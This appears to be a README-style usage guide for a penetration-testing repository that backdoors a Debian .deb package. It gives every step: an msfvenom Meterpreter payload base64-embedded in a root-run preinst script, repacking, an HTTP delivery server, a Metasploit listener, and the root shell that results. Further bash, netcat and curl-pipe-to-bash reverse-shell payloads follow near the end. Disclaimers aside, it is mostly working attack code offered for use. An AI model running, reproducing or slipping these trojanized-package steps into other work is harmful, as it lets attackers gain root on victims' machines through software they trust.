# 📖 Full Usage Guide — apt-root-backdoor

> ⚠️ **FOR EDUCATIONAL / AUTHORIZED TESTING ONLY.** See [../DISCLAIMER.md](../DISCLAIMER.md).

---

## Table of Contents

- [Lab Setup](#-lab-setup)
- [Step 1 — Extract & Inspect the Package](#step-1--extract--inspect-the-package)
- [Step 2 — Generate the Reverse Shell Payload](#step-2--generate-the-reverse-shell-payload)
- [Step 3 — Embed the Payload in preinst](#step-3--embed-the-payload-in-preinst)
- [Step 4 — Repack the .deb Package](#step-4--repack-the-deb-package)
- [Step 5 — Set Up the Metasploit Listener](#step-5--set-up-the-metasploit-listener)
- [Step 6 — Deliver and Execute](#step-6--deliver-and-execute)
- [Step 7 — Post-Exploitation](#step-7--post-exploitation)
- [Troubleshooting](#-troubleshooting)
- [Alternative Payloads](#-alternative-payloads)

---

## 🧪 Lab Setup

A safe, legal environment for testing this technique:

| Role | Recommended OS | Network |
|------|---------------|---------|
| **Attacker** | Kali Linux (VM or bare metal) | Host-only or NAT network |
| **Victim** | Ubuntu 22.04 / Debian 12 (VM) | Same virtual network as attacker |

### Find your attacker IP

```bash
ip a show eth0   # or the relevant interface
# or
hostname -I
```

Note the IP address — you will use it as `LHOST` throughout this guide.

### Verify tools are available

```bash
# Check msfvenom
msfvenom --version

# Check dpkg-deb
dpkg-deb --version

# Check python3 on victim
python3 --version
```

---

## Step 1 — Extract & Inspect the Package

The sample `.deb` file in the root of this repo (`filesearch_1.0.deb`) is used as a base. Start by extracting it:

```bash
dpkg-deb -R filesearch_1.0.deb extracted_folder/
```

List what was extracted:

```bash
ls -la extracted_folder/
ls -la extracted_folder/DEBIAN/
```

You should see at minimum:

```
extracted_folder/
├── DEBIAN/
│   ├── control        ← package metadata
│   └── preinst        ← maintainer script that runs BEFORE installation (AS ROOT)
└── usr/               ← package file tree (if any)
```

Read the existing `preinst`:

```bash
cat extracted_folder/DEBIAN/preinst
```

You can also inspect the package without extracting:

```bash
# List files in the package
dpkg -c filesearch_1.0.deb

# Show package metadata
dpkg-deb --info filesearch_1.0.deb
```

> ℹ️ **Why `preinst`?**  
> According to Debian policy, `preinst` is executed by `dpkg` **as root** before any package files are unpacked. This makes it the perfect execution point for a payload — it runs unconditionally, even if the package is broken or the installation is aborted immediately after.

---

## Step 2 — Generate the Reverse Shell Payload

Use `msfvenom` to create a Python-based Meterpreter reverse TCP payload:

```bash
msfvenom -p python/meterpreter_reverse_tcp \
  LHOST=<YOUR_IP> \
  LPORT=4444 \
  -f raw \
  -o /tmp/payload.py
```

**Parameter reference:**

| Parameter | Value | Description |
|-----------|-------|-------------|
| `-p` | `python/meterpreter_reverse_tcp` | Payload type (Python-based for cross-arch compatibility) |
| `LHOST` | Your attacker IP | Where the victim connects back to |
| `LPORT` | `4444` | Listening port on the attacker (choose any open port) |
| `-f raw` | — | Output format: raw Python script |
| `-o` | `/tmp/payload.py` | Output file |

View the generated payload (optional, for understanding):

```bash
head -5 /tmp/payload.py
wc -c /tmp/payload.py   # check size
```

### Encode the payload in Base64

Encoding allows the binary-safe payload to be embedded in a shell script as a single string:

```bash
base64 /tmp/payload.py > /tmp/payload.b64
```

View and copy the encoded payload:

```bash
cat /tmp/payload.b64
```

> ⚠️ The Base64 string may be several hundred characters long. Copy **all of it** carefully — including any line breaks (or remove them with `tr -d '\n'`).

To get a single-line Base64 string (easier to embed):

```bash
# Linux (GNU coreutils — default on Kali/Debian/Ubuntu):
base64 -w 0 /tmp/payload.py > /tmp/payload.b64

# macOS / BSD (base64 does not support -w; use this instead):
# base64 /tmp/payload.py | tr -d '\n' > /tmp/payload.b64

cat /tmp/payload.b64
```

> ℹ️ The `-w 0` flag is Linux-specific (GNU coreutils). macOS/BSD users should use the `tr -d '\n'` alternative shown above.

---

## Step 3 — Embed the Payload in `preinst`

Create or overwrite `extracted_folder/DEBIAN/preinst` with the following template:

```bash
#!/bin/bash
# preinst — executed as root before package installation
echo "<BASE64_ENCODED_PAYLOAD>" | base64 -d > /tmp/payload.py
python3 /tmp/payload.py &
exit 0
```

> 🔹 Replace `<BASE64_ENCODED_PAYLOAD>` with the single-line Base64 string from Step 2.  
> 🔹 The `&` backgrounds the payload so `dpkg` continues without waiting.  
> 🔹 `exit 0` ensures `dpkg` sees a clean exit from `preinst` (otherwise the install might be aborted before the payload connects).

Using a heredoc to write the file from the command line (replace the placeholder):

```bash
PAYLOAD_B64=$(cat /tmp/payload.b64)

cat > extracted_folder/DEBIAN/preinst << EOF
#!/bin/bash
echo "${PAYLOAD_B64}" | base64 -d > /tmp/payload.py
python3 /tmp/payload.py &
exit 0
EOF
```

Make it executable (required by `dpkg`):

```bash
chmod 755 extracted_folder/DEBIAN/preinst
```

Verify the result:

```bash
cat extracted_folder/DEBIAN/preinst
```

See [`../scripts/example-preinst.sh`](../scripts/example-preinst.sh) for a fully commented reference version.

---

## Step 4 — Repack the `.deb` Package

Rebuild the modified package:

```bash
dpkg-deb -b extracted_folder/ new_malicious.deb
```

Expected output:

```
dpkg-deb: building package 'filesearch' in 'new_malicious.deb'.
```

Verify the preinst script is correctly embedded:

```bash
# Extract just the DEBIAN control scripts to verify
dpkg-deb -e new_malicious.deb /tmp/verify_DEBIAN/
cat /tmp/verify_DEBIAN/preinst
```

Check the preinst permissions are intact:

```bash
ls -la /tmp/verify_DEBIAN/preinst
# Should show: -rwxr-xr-x (executable)
```

---

## Step 5 — Set Up the Metasploit Listener

**Start `msfconsole`** on your attacker machine:

```bash
msfconsole
```

**Configure the multi/handler:**

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload python/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <YOUR_IP>
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > set ExitOnSession false
msf6 exploit(multi/handler) > exploit -j
```

> 🔹 `ExitOnSession false` keeps the handler alive to catch multiple sessions.  
> 🔹 `exploit -j` runs the handler as a background job.

**One-liner alternative:**

```bash
msfconsole -q -x "use exploit/multi/handler; \
  set payload python/meterpreter/reverse_tcp; \
  set LHOST <YOUR_IP>; \
  set LPORT 4444; \
  set ExitOnSession false; \
  exploit -j"
```

See [`../scripts/setup-listener.sh`](../scripts/setup-listener.sh) for the full reference script.

---

## Step 6 — Deliver and Execute

Transfer `new_malicious.deb` to the victim machine using any available method (scp, http server, USB, etc.).

**Quick HTTP server to serve the file:**

```bash
# On attacker machine, from the directory containing new_malicious.deb:
python3 -m http.server 8080
```

**On the victim machine:**

```bash
# Download the package
wget http://<ATTACKER_IP>:8080/new_malicious.deb

# Install it (this triggers preinst as root)
sudo apt install ./new_malicious.deb
```

**What the victim sees:**

```
Reading package lists... Done
Building dependency tree... Done
(Reading database ... 12345 files and directories currently installed.)
Preparing to unpack new_malicious.deb ...
# ← preinst runs HERE silently
Setting up filesearch (1.0) ...
```

**What you see on the attacker machine:**

```
[*] Started reverse TCP handler on <YOUR_IP>:4444
[*] Meterpreter session 1 opened (<YOUR_IP>:4444 -> <VICTIM_IP>:PORT) at 2025-...

msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                    Information               Connection
  --  ----  ----                    -----------               ----------
  1         meterpreter python/linux  root @ victim-hostname  <YOUR_IP>:4444 -> <VICTIM_IP>:PORT
```

---

## Step 7 — Post-Exploitation

Once you have a Meterpreter session:

```
msf6 exploit(multi/handler) > sessions -i 1

meterpreter > getuid
Server username: root

meterpreter > sysinfo
Computer  : victim-hostname
OS        : Linux victim-hostname 5.15.0-91-generic #101-Ubuntu SMP ...
Meterpreter : python/linux

meterpreter > shell
Process 1234 created.
Channel 1 created.
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```

> ⚠️ **Stop here in a real engagement** — document findings, avoid unnecessary system changes, and report to the system owner.

---

## 🔧 Troubleshooting

| Issue | Likely Cause | Fix |
|-------|-------------|-----|
| `preinst` not executing | Wrong permissions | `chmod 755 extracted_folder/DEBIAN/preinst` |
| `dpkg-deb -b` fails | Malformed control file | Check `extracted_folder/DEBIAN/control` syntax |
| No callback received | Firewall blocking port | Try port 443 or 80; check `ufw`/`iptables` rules |
| Payload crashes on victim | Python3 not installed | Use a bash-only payload or install Python3 first |
| `msfvenom` payload is wrong arch | Victim is ARM/32-bit | Use `python/meterpreter_reverse_tcp` (platform-agnostic) |

---

## 🔄 Alternative Payloads

### Bash Reverse Shell (no Python required)

```bash
#!/bin/bash
bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1 &
exit 0
```

Listener:

```bash
nc -lvnp 4444
```

### Netcat Reverse Shell

```bash
#!/bin/bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <YOUR_IP> 4444 > /tmp/f &
exit 0
```

### curl/wget one-liner (stageless)

```bash
#!/bin/bash
curl -s http://<YOUR_IP>:8080/stage2.sh | bash &
exit 0
```

> ℹ️ These alternatives are useful when Python is not available on the victim or when you want a lightweight payload without Meterpreter overhead.

---

*For legal information, see [../DISCLAIMER.md](../DISCLAIMER.md).*
